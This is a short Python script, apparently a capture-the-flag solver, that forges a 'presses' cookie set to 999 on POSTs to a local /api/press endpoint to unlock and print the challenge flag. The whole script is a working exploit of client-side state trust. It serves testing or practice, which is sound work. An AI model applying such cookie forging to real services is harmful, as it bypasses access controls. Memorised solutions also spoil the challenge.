import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:63391"


def press(count):
    request = urllib.request.Request(
        f"{BASE}/api/press", method="POST", headers={"Cookie": f"presses={count}"}
    )
    with urllib.request.urlopen(request, timeout=10) as response:
        return json.load(response)


data = press(0)
assert data["stage"] == "loose" and "flag" not in data
data = press(999)
assert data["stage"] == "open"
print(data["flag"])
